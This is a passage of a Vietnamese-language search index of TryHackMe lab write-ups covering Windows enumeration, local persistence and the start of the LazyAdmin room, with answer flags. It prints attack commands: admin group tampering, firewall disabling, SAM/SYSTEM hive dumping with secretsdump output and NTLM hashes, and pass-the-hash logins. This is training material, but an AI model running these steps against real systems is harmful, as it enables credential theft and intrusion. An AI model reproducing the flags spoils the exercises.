C:\\Users\\kkidd\\Desktop\\ Services and Process \u00b6 Sharing files and Printers \u00b6 Answer the question bellow \u00b6 Finally, we can see it is listening on port 8080. Now try to apply what we discussed and find the port number for THM Service. What is the port number? 13337 Step 1: Ki\u1ec3m tra d\u1ecbch v\u1ee5 \u0111ang ch\u1ea1y: net start Alt text Step 2: Ki\u1ec3m tra d\u1ecbch v\u1ee5 THM Seivice: wmic service where \"name like 'THM Seivice'\" get Name,PathName Alt text Step 3: Xem ti\u1ebfn tr\u00ecnh d\u1ecbch v\u1ee5 th\u00f4ng qua Name v\u00e0 Path: Get-Process -Name thm-service Alt text H\u00ecnh tr\u00ean cho ta th\u1ea5y ti\u1ebfn tr\u00ecnh c\u00f3 ID 2736. Ta s\u1ebd li\u1ec7t k\u00ea port internet th\u00f4ng qua ID ti\u1ebfn tr\u00ecnh: netstat -noa | findstr \"LISTENING\" | findstr \"2736\" Alt text Ta th\u1ea5y n\u00f3 listen \u1edf port 13337 , \u0111\u00e2y c\u0169ng l\u00e0 \u0111\u00e1p \u00e1n cho c\u00e2u h\u1ecfi \u0111\u1ea7u ti\u00ean Visit the localhost on the port you found in Question #1 . What is the flag? THM{S3rv1cs_1s_3numerat37ed} Alt text Now enumerate the domain name of the domain controller, thmredteam.com, using the nslookup.exe, and perform a DNS zone transfer. What is the flag for one of the records? THM{DNS-15-Enumerated!} Step 1: Tranfer DNS b\u1eb1ng nslookup Step 2: \u0110\u1eb7t: server MACHINE_IP Step 3: ls -d thmredteam.com Xem h\u00ecnh b\u00ean d\u01b0\u1edbi Alt text Task 10: Conclusion \u00b6 This room is an introduction to client systems in corporate environments. The student should have a better understanding of how clients are used in a corporate network including: Network Infrastructure AD environment security measures (HIPS, AV, etc.) Internal applications and services Xem th\u00eam t\u1ea1i https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon \u21a9","title":"The Lay of the Land"},{"location":"tryhackme/room/l/the-lay-of-the-land/#the-lay-of-the-land","text":"","title":"The Lay of the Land"},{"location":"tryhackme/room/l/the-lay-of-the-land/#task-1-introduction","text":"It is essential to be familiar with the environment where you have initial access to a compromised machine during a red team engagement. Therefore, performing reconnaissance and enumeration is a significant part, and the primary goal is to gather as much information as possible to be used in the next stage. With an initial foothold established, the post-exploitation process begins! This room introduces commonly-used concepts, technologies, and security products that we need to be aware of. In this room, the assumption is that we have already gained access to the machine, and we are ready to expand our knowledge more about the environment by performing enumerating for the following: Network infrastrucutre Active Directory Environment Users and Groups Host-based security solutions Network-based security solutions Applications and services","title":"Task 1: Introduction"},{"location":"tryhackme/room/l/the-lay-of-the-land/#answer-the-question-bellow","text":"Let's start learning! No needed answer","title":"Answer the question bellow"},{"location":"tryhackme/room/l/the-lay-of-the-land/#task-2-deploy-the-vm","text":"","title":"Task 2: Deploy the VM"},{"location":"tryhackme/room/l/the-lay-of-the-land/#answer-the-question-bellow_1","text":"Let's discuss the common network infrastructure in the next task! No needed answer","title":"Answer the question bellow"},{"location":"tryhackme/room/l/the-lay-of-the-land/#task-3-network-infrastructure","text":"","title":"Task 3: Network Infrastructure"},{"location":"tryhackme/room/l/the-lay-of-the-land/#noi-dung-chinh","text":"T\u1eeb \u0111\u00e2y tr\u1edf \u0111i, t\u00f4i s\u1ebd n\u00f3i ti\u1ebfng vi\u1ec7t v\u00e0 c\u00f3 th\u1ec3 t\u00f3m t\u1eaft m\u1ed9t v\u00e0i \u0111i\u1ec1u m\u00e0 c\u1ea7n n\u1eafm trong nh\u1eefng task. Ta c\u00f3 m\u1ed9t s\u1ed1 th\u1ee9 c\u01a1 b\u1ea3n v\u1ec1 network nh\u01b0 sau: Internal Networks : L\u00e0 v\u00f9ng m\u1ea1ng n\u1ed9i b\u1ed9 gi\u00fap chia s\u1ebb th\u00f4ng tin v\u00e0 li\u00ean l\u1ea1c nhanh h\u01a1n trong t\u1ed5 ch\u1ee9c. Nh\u1eefng ng\u01b0\u1eddi system admin s\u1ebd config nh\u1eefng th\u1ee9 n\u00e0y Alt text Tr\u00ean \u0111\u00e2y l\u00e0 h\u00ecnh \u1ea3nh s\u01a1 l\u01b0\u1ee3c DMZ Zone : V\u00f9ng DMZ l\u00e0 v\u00f9ng m\u1ea1ng ngo\u1ea1i bi\u00ean d\u00f9ng \u0111\u1ec3 b\u1ea3o v\u1ec7 cho v\u00f9ng m\u1ea1ng n\u1ed9i b\u1ed9 b\u1eb1ng c\u00e1ch \u0111\u1ea9y c\u00e1c traffic kh\u00f4ng \u0111\u00e1ng tin c\u1eady ra v\u00f9ng n\u00e0y. Alt text Trong s\u01a1 \u0111\u1ed3 tr\u01b0\u1edbc, ch\u00fang t\u00f4i bi\u1ec3u th\u1ecb l\u01b0u l\u01b0\u1ee3ng m\u1ea1ng \u0111\u1ebfn m\u1ea1ng DMZ b\u1eb1ng m\u00e0u \u0111\u1ecf, kh\u00f4ng \u0111\u00e1ng tin c\u1eady (\u0111\u1ebfn tr\u1ef1c ti\u1ebfp t\u1eeb internet). L\u01b0u l\u01b0\u1ee3ng m\u1ea1ng xanh gi\u1eefa m\u1ea1ng n\u1ed9i b\u1ed9 l\u00e0 l\u01b0u l\u01b0\u1ee3ng \u0111\u01b0\u1ee3c ki\u1ec3m so\u00e1t c\u00f3 th\u1ec3 \u0111i qua m\u1ed9t ho\u1eb7c nhi\u1ec1u thi\u1ebft b\u1ecb an ninh m\u1ea1ng. Vi\u1ec7c li\u1ec7t k\u00ea h\u1ec7 th\u1ed1ng v\u00e0 m\u1ea1ng n\u1ed9i b\u1ed9 l\u00e0 giai \u0111o\u1ea1n kh\u00e1m ph\u00e1, cho ph\u00e9p k\u1ebb t\u1ea5n c\u00f4ng t\u00ecm hi\u1ec3u v\u1ec1 h\u1ec7 th\u1ed1ng v\u00e0 m\u1ea1ng n\u1ed9i b\u1ed9. D\u1ef1a tr\u00ean th\u00f4ng tin thu \u0111\u01b0\u1ee3c, ch\u00fang t\u00f4i s\u1eed d\u1ee5ng th\u00f4ng tin \u0111\u00f3 \u0111\u1ec3 x\u1eed l\u00fd chuy\u1ec3n \u0111\u1ed9ng ngang ho\u1eb7c leo thang \u0111\u1eb7c quy\u1ec1n nh\u1eb1m \u0111\u1ea1t \u0111\u01b0\u1ee3c nhi\u1ec1u \u0111\u1eb7c quy\u1ec1n h\u01a1n tr\u00ean h\u1ec7 th\u1ed1ng ho\u1eb7c m\u00f4i tr\u01b0\u1eddng AD. Network Enumeration : D\u00f9ng netstat \u0111\u1ec3 ki\u1ec3m tra c\u00e1c k\u1ebft n\u1ed1i tcp, udp,... Command Prompt PS C :\\ Users \\ thm > netstat -na Active Connections Proto Local Address Foreign Address State TCP 0 . 0 . 0 . 0 : 80 0 . 0 . 0 . 0 : 0 LISTENING TCP 0 . 0 . 0 . 0 : 88 0 . 0 . 0 . 0 : 0 LISTENING TCP 0 . 0 . 0 . 0 : 135 0 . 0 . 0 . 0 : 0 LISTENING TCP 0 . 0 . 0 . 0 : 389 0 . 0 . 0 . 0 : 0 LISTENING Command Prompt PS C :\\ Users \\ thm > arp -a Interface : 10 . 10 . 141 . 51 --- 0xa Internet Address Physical Address Type 10 . 10 . 0 . 1 02-c8 - 85-b5 - 5a-aa dynamic 10 . 10 . 255 . 255 ff-ff-ff-ff-ff-ff static","title":"N\u1ed9i dung ch\u00ednh"},{"location":"tryhackme/room/l/the-lay-of-the-land/#task-4-active-directory-ad-environment","text":"A list of Active Directory components that we need to be familiar with: Domain Controllers Organizational Units AD objects AD Domains Forest AD Service Accounts: Built-in local users, Domain users, Managed service accounts Domain Administrators Alt text \u0110\u1ec3 ki\u1ec3m tra xem m\u00e1y t\u00ednh c\u00f3 ph\u1ea3i m\u1ed9t ph\u1ea7n trong AD hay kh\u00f4ng ta d\u00f9ng l\u1ec7nh systeminfo Powershell PS C :\\ Users \\ thm > systeminfo | findstr Domain OS Configuration : Primary Domain Controller Domain : thmdomain . com V\u1edbi k\u1ebft qu\u1ea3 tr\u00ean, m\u00e1y \u0111ang l\u00e0 1 ph\u1ea7n c\u1ee7a AD v\u1edbi domain thmdomain.com N\u1ebfu k\u1ebft qu\u1ea3 b\u1ea1n cho ra l\u00e0 WORKGROUP (th\u00f4ng th\u01b0\u1eddng test tr\u00ean m\u00e1y t\u00ednh c\u00e1 nh\u00e2n) th\u00ec \u0111\u00e2y l\u00e0 m\u00f4i tr\u01b0\u1eddng c\u1ee5c b\u1ed9.","title":"Task 4: Active Directory (AD) environment"},{"location":"tryhackme/room/l/the-lay-of-the-land/#answer-the-questions-bellow","text":"Before going any further, ensure the attached machine is deployed and try what we discussed. Is the attached machine part of the AD environment? (Y|N) y Ta ki\u1ec3m tra b\u1eb1ng l\u1ec7nh systeminfo | findstr Domain Alt text If it is part of an AD environment, what is the domain name of the AD? thmredteam.com Task 5: Users and Groups Management BUILTIN\\Administrator Local admin access on a domain controller Domain Admins Administrative access to all resources in the domain Enterprise Admins Available only in the forest root Schema Admins Capable of modifying domain/forest; useful for red teamers Server Operators Can manage domain servers Account Operators Can manage users that are not in privileged groups","title":"Answer the questions bellow"},{"location":"tryhackme/room/l/the-lay-of-the-land/#active-directory-ad-enum","text":"Ta d\u00f9ng l\u1ec7nh Get-ADUser -Filter * \u0111\u1ec3 l\u1ea5y c\u00e1c t\u00e0i kho\u1ea3n trong AD","title":"Active Directory (AD) Enum"},{"location":"tryhackme/room/l/the-lay-of-the-land/#answer-the-questions-bellow_1","text":"Use the Get-ADUser -Filter * -SearchBase command to list the available user accounts within THM OU in the thmredteam.com domain. How many users are available? 6 D\u00f9ng l\u1ec7nh Get-ADUser -Filter * -SearchBase \"OU=THM,DC=thmredteam,DC=com\" nh\u1eb1m l\u1ea5y user t\u1eeb t\u1ed5 ch\u1ee9c THM Once you run the previous command, what is the UserPrincipalName (email) of the admin account? thmadmin@thmredteam.com Task 6: Host Security Solution #1","title":"Answer the questions bellow"},{"location":"tryhackme/room/l/the-lay-of-the-land/#host-security-solutions","text":"Antivirus software: Signature-based detection is one of the common and traditional techniques used in antivirus software to identify malicious files. Often, researchers or users submit their infected files into an antivirus engine platform for further analysis by AV vendors, and if it confirms as malicious, then the signature gets registered in their database. The antivirus software compares the scanned file with a database of known signatures for possible attacks and malware on the client-side. If we have a match, then it considers a threat. Heuristic-based detection uses machine learning to decide whether we have the malicious file or not. It scans and statically analyses in real-time in order to find suspicious properties in the application's code or check whether it uses uncommon Windows or system APIs. It does not rely on the signature-based attack in making the decisions, or sometimes it does. This depends on the implementation of the antivirus software. Finally, Behavior-based detection relies on monitoring and examining the execution of applications to find abnormal behaviors and uncommon activities, such as creating/updating values in registry keys, killing/creating processes, etc. As a red teamer, it is essential to be aware of whether antivirus exists or not. It prevents us from doing what we are attempting to do. We can enumerate AV software using Windows built-in tools, such as wmic. D\u00f9ng wmic (wmic /namespace:\\root\\securitycenter2 path antivirusproduct) \u0111\u1ec3 li\u1ec7t k\u00ea ph\u1ea7n m\u1ec1m anti virus L\u1ec7nh c\u00f3 \u00fd ngh\u0129a t\u01b0\u01a1ng \u0111\u01b0\u01a1ng tr\u00ean poweshell: Get-CimInstance -Namespace root / SecurityCenter2 -ClassName AntivirusProduct Microsoft Windows Defender: Ki\u1ec3m tra tr\u1ea1ng th\u00e1i d\u1ecbch v\u1ee5 c\u1ee7a Windows Defender: Get-Service WinDefend Ki\u1ec3m tra tr\u1ea1ng th\u00e1i realtime protection: Get-MpComputerStatus | select RealTimeProtectionEnabled Host-based Firewall: Ki\u1ec3m tra t\u01b0\u1eddng l\u1eeda Get-NetFirewallProfile | Format-Table Name , Enabled L\u1ec7nh t\u1eaft t\u01b0\u1eddng l\u1eeda (\u1edf vai tr\u00f2 qu\u1ea3n tr\u1ecb vi\u00ean) Set-NetFirewallProfile -Profile Domain , Public , Private -Enabled False Select property c\u1ee7a t\u01b0\u1eddng l\u1eeda: Get-NetFirewallRule | select * Get-NetFirewallRule | select DisplayName , Enabled , Description Ki\u1ec3m tra k\u1ebft n\u1ed1i Test-NetConnection -ComputerName 127 . 0 . 0 . 1 -Port 80 Security Event Logging and Monitoring Host-based Intrusion Detection System (HIDS)/ Host-based Intrusion Prevention System (HIPS) Endpoint Detection and Response (EDR)","title":"Host Security Solutions"},{"location":"tryhackme/room/l/the-lay-of-the-land/#answer-the-questions-bellow_2","text":"Enumerate the attached Windows machine and check whether the host-based firewall is enabled or not! (Y|N) N Ki\u1ec3m tra b\u1eb1ng l\u1ec7nh Get-NetFirewallProfile | Format-Table Name, Enabled ta th\u1ea5y t\u01b0\u1eddng l\u1eeda ch\u01b0a \u0111\u01b0\u1ee3c b\u1eadt. Alt text Using PowerShell cmdlets such Get-MpThreat can provide us with threats details that have been detected using MS Defender. Run it and answer the following: What is the file name that causes this alert to record? powerview.ps1 Xem h\u00ecnh sau Alt text UEnumerate the firewall rules of the attached Windows machine. What is the port that is allowed under the THM-Connection rule? 17337 D\u00f9ng l\u1ec7nh get-netfirewallrule | select displayname , enabled , description Xem h\u00ecnh sau Alt text In the next task, we will keep discussing the host security solution. I'm ready! No needed answer","title":"Answer the questions bellow"},{"location":"tryhackme/room/l/the-lay-of-the-land/#task-7-host-security-solution-2","text":"Ta s\u1ebd n\u00f3i v\u1ec1 m\u1ed9t s\u1ed1 gi\u1ea3i ph\u00e1p b\u1ea3o m\u1eadt","title":"Task 7: Host Security Solution #2"},{"location":"tryhackme/room/l/the-lay-of-the-land/#security-event-logging-and-monitoring","text":"D\u00f9ng l\u1ec7nh Get-EventLog -List","title":"Security Event Logging and Monitoring"},{"location":"tryhackme/room/l/the-lay-of-the-land/#system-monitor-sysmon1","text":"M\u1ed9t trong nh\u1eefng t\u00ednh n\u0103ng c\u1ee7a sysmon Process creation and termination Network connections Modification on file Remote threats Process and memory access and many others Ki\u1ec3m tra sysmon c\u00f3 \u0111\u01b0\u1ee3c c\u00e0i \u0111\u1eb7t ch\u01b0a: - Get-Process | Where-Object { $_.ProcessName -eq \"Sysmon\" } - reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Sysmon/Operational","title":"System Monitor (Sysmon)1"},{"location":"tryhackme/room/l/the-lay-of-the-land/#host-based-intrusion-detectionprevention-system-hidships","text":"Alt text HIDS stands for Host-based Intrusion Detection System. It is software that has the ability to monitor and detect abnormal and malicious activities in a host. The primary purpose of HIDS is to detect suspicious activities and not to prevent them. There are two methods that the host-based or network intrusion detection system works, including: Signature-based IDS - it looks at checksums and message authentication. Anomaly-based IDS looks for unexpected activities, including abnormal bandwidth usage, protocols, and ports. Host-based Intrusion Prevention Systems (HIPS) works by securing the operating system activities which where is installed. It is a detecting and prevention solution against well-known attacks and abnormal behaviors. HIPS is capable of auditing log files of the host, monitoring processes, and protecting system resources. HIPS is a mixture of best product features such as antivirus, behavior analysis, network, application firewall, etc. There is also a network-based IDS/IPS, which we will be covering in the next task.","title":"Host-based Intrusion Detection/Prevention System (HIDS/HIPS)"},{"location":"tryhackme/room/l/the-lay-of-the-land/#endpoint-detection-and-response-edr","text":"Alt text It is also known as Endpoint Detection and Threat Response (EDTR). The EDR is a cybersecurity solution that defends against malware and other threats. EDRs can look for malicious files, monitor endpoint, system, and network events, and record them in a database for further analysis, detection, and investigation. EDRs are the next generation of antivirus and detect malicious activities on the host in real-time. EDR analyze system data and behavior for making section threats, including Malware, including viruses, trojans, adware, keyloggers Exploit chains Ransomware Below are some common EDR software for endpoints Cylance Crowdstrike Symantec SentinelOne Many others Even though an attacker successfully delivered their payload and bypassed EDR in receiving reverse shell, EDR is still running and monitors the system. It may block us from doing something else if it flags an alert. We can use scripts for enumerating security products within the machine, such as Invoke-EDRChecker and SharpEDRChecker . They check for commonly used Antivirus, EDR, logging monitor products by checking file metadata, processes, DLL loaded into current processes, Services, and drivers, directories.","title":"Endpoint Detection and Response (EDR)"},{"location":"tryhackme/room/l/the-lay-of-the-land/#task-8-network-security-solutions","text":"","title":"Task 8: Network Security Solutions"},{"location":"tryhackme/room/l/the-lay-of-the-land/#task-9-applications-and-services","text":"","title":"Task 9: Applications and Services"},{"location":"tryhackme/room/l/the-lay-of-the-land/#installed-applications","text":"Li\u1ec7t k\u00ea c\u00e1c \u1ee9ng d\u1ee5ng \u0111\u00e3 c\u00e0i \u0111\u1eb7t: wmic product get name,version T\u00ecm ki\u1ebfm th\u01b0 m\u1ee5c/t\u1ec7p tin \u1ea9n b\u1eb1ng Get-ChildItem v\u1edbi c\u1edd Hidden: Get-ChildItem -Hidden -Path C:\\Users\\kkidd\\Desktop\\","title":"Installed Applications"},{"location":"tryhackme/room/l/the-lay-of-the-land/#services-and-process","text":"","title":"Services and Process"},{"location":"tryhackme/room/l/the-lay-of-the-land/#sharing-files-and-printers","text":"","title":"Sharing files and Printers"},{"location":"tryhackme/room/l/the-lay-of-the-land/#answer-the-question-bellow_2","text":"Finally, we can see it is listening on port 8080. Now try to apply what we discussed and find the port number for THM Service. What is the port number? 13337 Step 1: Ki\u1ec3m tra d\u1ecbch v\u1ee5 \u0111ang ch\u1ea1y: net start Alt text Step 2: Ki\u1ec3m tra d\u1ecbch v\u1ee5 THM Seivice: wmic service where \"name like 'THM Seivice'\" get Name,PathName Alt text Step 3: Xem ti\u1ebfn tr\u00ecnh d\u1ecbch v\u1ee5 th\u00f4ng qua Name v\u00e0 Path: Get-Process -Name thm-service Alt text H\u00ecnh tr\u00ean cho ta th\u1ea5y ti\u1ebfn tr\u00ecnh c\u00f3 ID 2736. Ta s\u1ebd li\u1ec7t k\u00ea port internet th\u00f4ng qua ID ti\u1ebfn tr\u00ecnh: netstat -noa | findstr \"LISTENING\" | findstr \"2736\" Alt text Ta th\u1ea5y n\u00f3 listen \u1edf port 13337 , \u0111\u00e2y c\u0169ng l\u00e0 \u0111\u00e1p \u00e1n cho c\u00e2u h\u1ecfi \u0111\u1ea7u ti\u00ean Visit the localhost on the port you found in Question #1 . What is the flag? THM{S3rv1cs_1s_3numerat37ed} Alt text Now enumerate the domain name of the domain controller, thmredteam.com, using the nslookup.exe, and perform a DNS zone transfer. What is the flag for one of the records? THM{DNS-15-Enumerated!} Step 1: Tranfer DNS b\u1eb1ng nslookup Step 2: \u0110\u1eb7t: server MACHINE_IP Step 3: ls -d thmredteam.com Xem h\u00ecnh b\u00ean d\u01b0\u1edbi Alt text","title":"Answer the question bellow"},{"location":"tryhackme/room/l/the-lay-of-the-land/#task-10-conclusion","text":"This room is an introduction to client systems in corporate environments. The student should have a better understanding of how clients are used in a corporate network including: Network Infrastructure AD environment security measures (HIPS, AV, etc.) Internal applications and services Xem th\u00eam t\u1ea1i https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon \u21a9","title":"Task 10: Conclusion"},{"location":"tryhackme/room/l/thelayoftheland/","text":"Introduction to Antivirus \u00b6 Room at https://tryhackme.com/room/thelayoftheland","title":"Introduction to Antivirus"},{"location":"tryhackme/room/l/thelayoftheland/#introduction-to-antivirus","text":"Room at https://tryhackme.com/room/thelayoftheland","title":"Introduction to Antivirus"},{"location":"tryhackme/room/l/windows-local-persistence/","tags":["THM-Room","Red Teaming - Post Compromise"],"text":"Windows Local Persistence \u00b6 Task 1: Introduction \u00b6 Sau khi c\u00f3 nh\u1eefng b\u01b0\u1edbc \u0111\u1ea7u th\u00e2m nh\u1eadp h\u1ec7 th\u1ed1ng c\u1ee5c b\u1ed9, b\u1ea1n ph\u1ea3i ghi nh\u1edb: Re-exploitation isn't always possible Gaining a foothold is hard to reproduce The blue team is after you Task 2: Tampering With Unprivileged Accounts \u00b6 Assign Group Memberships \u00b6 C\u00e1ch tr\u1ef1c ti\u1ebfp \u0111\u1ec3 bi\u1ebfn 1 ng\u01b0\u1eddi d\u00f9ng b\u00ecnh th\u01b0\u1eddng kh\u00f4ng c\u00f3 \u0111\u1eb7c quy\u1ec1n c\u00f3 \u0111\u01b0\u1ee3c quy\u1ec1n Admin l\u00e0 bi\u1ebfn ng\u01b0\u1eddi d\u00f9ng \u0111\u00f3 th\u00e0nh m\u1ed9t ph\u1ea7n c\u1ee7a nh\u00f3m Admin. D\u00f9ng l\u1ec7nh net localgroup administrators thmuser0 / add C :\\> net localgroup \"Backup Operators\" thmuser1 / add C :\\> net localgroup \"Remote Management Users\" thmuser1 / add reg add HKLM \\ SOFTWARE \\ Microsoft \\ Windows \\ CurrentVersion \\ Policies \\ System / t REG_DWORD / v LocalAccountTokenFilterPolicy / d 1 AttackBox user @AttackBox $ evil-winrm -i MACHINE_IP -u thmuser1 -p Password321 * Evil-WinRM * PS C :\\> whoami / groups GROUP INFORMATION ----------------- Group Name Type SID Attributes ==================================== ================ ============ ================================================== Everyone Well-known group S - 1 - 1 - 0 Mandatory group , Enabled by default , Enabled group BUILTIN \\ Users Alias S - 1 - 5 - 32 - 545 Mandatory group , Enabled by default , Enabled group BUILTIN \\ Backup Operators Alias S - 1 - 5 - 32 - 551 Mandatory group , Enabled by default , Enabled group BUILTIN \\ Remote Management Users Alias S - 1 - 5 - 32 - 580 Mandatory group , Enabled by default , Enabled group NT AUTHORITY \\ NETWORK Well-known group S - 1 - 5 - 2 Mandatory group , Enabled by default , Enabled group NT AUTHORITY \\ Authenticated Users Well-known group S - 1 - 5 - 11 Mandatory group , Enabled by default , Enabled group NT AUTHORITY \\ This Organization Well-known group S - 1 - 5 - 15 Mandatory group , Enabled by default , Enabled group NT AUTHORITY \\ Local account Well-known group S - 1 - 5 - 113 Mandatory group , Enabled by default , Enabled group NT AUTHORITY \\ NTLM Authentication Well-known group S - 1 - 5 - 64 - 10 Mandatory group , Enabled by default , Enabled group Mandatory Label \\ High Mandatory Level Label S - 1 - 16 - 12288 AttackBox * Evil-WinRM * PS C :\\> reg save hklm \\ system system . bak The operation completed successfully . * Evil-WinRM * PS C :\\> reg save hklm \\ sam sam . bak The operation completed successfully . * Evil-WinRM * PS C :\\> download system . bak Info : Download successful ! * Evil-WinRM * PS C :\\> download sam . bak Info : Download successful ! AttackBox user @AttackBox $ python3 . 9 / opt / impacket / examples / secretsdump . py -sam sam . bak -system system . bak LOCAL Impacket v0 . 9 . 24 . dev1 + 20210704 . 162046 . 29ad5792 - Copyright 2021 SecureAuth Corporation [*] Target system bootKey : 0x41325422ca00e6552bb6508215d8b426 [*] Dumping local SAM hashes ( uid : rid : lmhash : nthash ) Administrator : 500 : aad3b435b51404eeaad3b435b51404ee : 1cea1d7e8899f69e89088c4cb4bbdaa3 ::: Guest : 501 : aad3b435b51404eeaad3b435b51404ee : 31d6cfe0d16ae931b73c59d7e0c089c0 ::: DefaultAccount : 503 : aad3b435b51404eeaad3b435b51404ee : 31d6cfe0d16ae931b73c59d7e0c089c0 ::: WDAGUtilityAccount : 504 : aad3b435b51404eeaad3b435b51404ee : 9657e898170eb98b25861ef9cafe5bd6 ::: thmuser1 : 1011 : aad3b435b51404eeaad3b435b51404ee : e41fd391af74400faa4ff75868c93cce ::: [*] Cleaning up ... AttackBox user @AttackBox $ evil-winrm -i MACHINE_IP -u Administrator -H 1cea1d7e8899f69e89088c4cb4bbdaa3 Special Privileges and Security Descriptors \u00b6","title":"Windows Local Persistence"},{"location":"tryhackme/room/l/windows-local-persistence/#windows-local-persistence","text":"","title":"Windows Local Persistence"},{"location":"tryhackme/room/l/windows-local-persistence/#task-1-introduction","text":"Sau khi c\u00f3 nh\u1eefng b\u01b0\u1edbc \u0111\u1ea7u th\u00e2m nh\u1eadp h\u1ec7 th\u1ed1ng c\u1ee5c b\u1ed9, b\u1ea1n ph\u1ea3i ghi nh\u1edb: Re-exploitation isn't always possible Gaining a foothold is hard to reproduce The blue team is after you","title":"Task 1: Introduction"},{"location":"tryhackme/room/l/windows-local-persistence/#task-2-tampering-with-unprivileged-accounts","text":"","title":"Task 2: Tampering With Unprivileged Accounts"},{"location":"tryhackme/room/l/windows-local-persistence/#assign-group-memberships","text":"C\u00e1ch tr\u1ef1c ti\u1ebfp \u0111\u1ec3 bi\u1ebfn 1 ng\u01b0\u1eddi d\u00f9ng b\u00ecnh th\u01b0\u1eddng kh\u00f4ng c\u00f3 \u0111\u1eb7c quy\u1ec1n c\u00f3 \u0111\u01b0\u1ee3c quy\u1ec1n Admin l\u00e0 bi\u1ebfn ng\u01b0\u1eddi d\u00f9ng \u0111\u00f3 th\u00e0nh m\u1ed9t ph\u1ea7n c\u1ee7a nh\u00f3m Admin. D\u00f9ng l\u1ec7nh net localgroup administrators thmuser0 / add C :\\> net localgroup \"Backup Operators\" thmuser1 / add C :\\> net localgroup \"Remote Management Users\" thmuser1 / add reg add HKLM \\ SOFTWARE \\ Microsoft \\ Windows \\ CurrentVersion \\ Policies \\ System / t REG_DWORD / v LocalAccountTokenFilterPolicy / d 1 AttackBox user @AttackBox $ evil-winrm -i MACHINE_IP -u thmuser1 -p Password321 * Evil-WinRM * PS C :\\> whoami / groups GROUP INFORMATION ----------------- Group Name Type SID Attributes ==================================== ================ ============ ================================================== Everyone Well-known group S - 1 - 1 - 0 Mandatory group , Enabled by default , Enabled group BUILTIN \\ Users Alias S - 1 - 5 - 32 - 545 Mandatory group , Enabled by default , Enabled group BUILTIN \\ Backup Operators Alias S - 1 - 5 - 32 - 551 Mandatory group , Enabled by default , Enabled group BUILTIN \\ Remote Management Users Alias S - 1 - 5 - 32 - 580 Mandatory group , Enabled by default , Enabled group NT AUTHORITY \\ NETWORK Well-known group S - 1 - 5 - 2 Mandatory group , Enabled by default , Enabled group NT AUTHORITY \\ Authenticated Users Well-known group S - 1 - 5 - 11 Mandatory group , Enabled by default , Enabled group NT AUTHORITY \\ This Organization Well-known group S - 1 - 5 - 15 Mandatory group , Enabled by default , Enabled group NT AUTHORITY \\ Local account Well-known group S - 1 - 5 - 113 Mandatory group , Enabled by default , Enabled group NT AUTHORITY \\ NTLM Authentication Well-known group S - 1 - 5 - 64 - 10 Mandatory group , Enabled by default , Enabled group Mandatory Label \\ High Mandatory Level Label S - 1 - 16 - 12288 AttackBox * Evil-WinRM * PS C :\\> reg save hklm \\ system system . bak The operation completed successfully . * Evil-WinRM * PS C :\\> reg save hklm \\ sam sam . bak The operation completed successfully . * Evil-WinRM * PS C :\\> download system . bak Info : Download successful ! * Evil-WinRM * PS C :\\> download sam . bak Info : Download successful ! AttackBox user @AttackBox $ python3 . 9 / opt / impacket / examples / secretsdump . py -sam sam . bak -system system . bak LOCAL Impacket v0 . 9 . 24 . dev1 + 20210704 . 162046 . 29ad5792 - Copyright 2021 SecureAuth Corporation [*] Target system bootKey : 0x41325422ca00e6552bb6508215d8b426 [*] Dumping local SAM hashes ( uid : rid : lmhash : nthash ) Administrator : 500 : aad3b435b51404eeaad3b435b51404ee : 1cea1d7e8899f69e89088c4cb4bbdaa3 ::: Guest : 501 : aad3b435b51404eeaad3b435b51404ee : 31d6cfe0d16ae931b73c59d7e0c089c0 ::: DefaultAccount : 503 : aad3b435b51404eeaad3b435b51404ee : 31d6cfe0d16ae931b73c59d7e0c089c0 ::: WDAGUtilityAccount : 504 : aad3b435b51404eeaad3b435b51404ee : 9657e898170eb98b25861ef9cafe5bd6 ::: thmuser1 : 1011 : aad3b435b51404eeaad3b435b51404ee : e41fd391af74400faa4ff75868c93cce ::: [*] Cleaning up ... AttackBox user @AttackBox $ evil-winrm -i MACHINE_IP -u Administrator -H 1cea1d7e8899f69e89088c4cb4bbdaa3","title":"Assign Group Memberships"},{"location":"tryhackme/room/l/windows-local-persistence/#special-privileges-and-security-descriptors","text":"","title":"Special Privileges and Security Descriptors"},{"location":"tryhackme/room/lazyadmin/","tags":["THM-Room","Privilege Escalation"],"text":"LazyAdmin \u00b6 Room at https://tryhackme.com/room/lazyadmin Task 1: Lazy Admin \u00b6 Answer the questions bellow \u00b6 What is the user flag? Ans: THM{63e5bce9271952aad1113b6f1ac28a07} What is the root flag? Ans: THM{6637f41d0177b6f37cb20d775124699f} H\u01b0\u1edbng d\u1eabn \u00b6 \u0110\u1ea7u ti\u00ean khi v\u00e0o IP, c\u00e1c b\u1ea1n s\u1ebd kh\u00f4ng th\u1ea5y g\u00ec \u0111\u00e2u ::). Ta ph\u1ea3i th\u1ef1c hi\u1ec7n recon trang web th\u00ec th\u1ea5y \u0111\u01b0\u1ee3c website chu\u1ea9n ch\u1ec9 l\u00e0 http://IP/content . Ti\u1ebfp t\u1ee5c, gobuster ti\u1ebfp ta \u0111\u01b0\u1ee3c trang inc (ch\u1ee9a th\u00f4ng tin c\u00e1c file code php, txt, db, ...) v\u00e0 trang http://IP/content/as \u0111\u1ec3 login account. G\u1ed3i g\u1ed3i, sau m\u1ed9t h\u1ed3i xem x\u00e9t website th\u00ec th\u1ea5y file mysql_bakup_20191129023059-1.5.1.sql ch\u1ee9a \u0111o\u1ea1n d\u01b0\u1edbi \u0111\u00e2y 14 => 'INSERT INTO `%--%_options` VALUES(\\' 1 \\ ',\\' global_setting \\ ',\\' a : 17 : { s : 4 : \\\\ \"name\\\\\" ; s : 25 : \\\\ \"Lazy Admin&#039;s Website\\\\\" ; s : 6 : \\\\ \"author\\\\\" ; s : 10 : \\\\ \"Lazy Admin\\\\\" ; s : 5 : \\\\ \"title\\\\\" ; s : 0 : \\\\ \"\\\\\" ; s : 8 : \\\\ \"keywords\\\\\" ; s : 8 : \\\\ \"Keywords\\\\\" ; s : 11 : \\\\ \"description\\\\\" ; s : 11 : \\\\ \"Description\\\\\" ; s : 5 : \\\\ \"admin\\\\\" ; s : 7 : \\\\ \"manager\\\\\" ; s : 6 : \\\\ \"passwd\\\\\" ; s : 32 : \\\\ \"42f749ade7f9e195bf475f37a44cafcb\\\\\" ; s : 5 : \\\\ \"close\\\\\" ; i : 1 ; s : 9 : \\\\ \"close_tip\\\\\" ; s : 454 : \\\\ \"<p>Welcome to SweetRice - Thank your for install 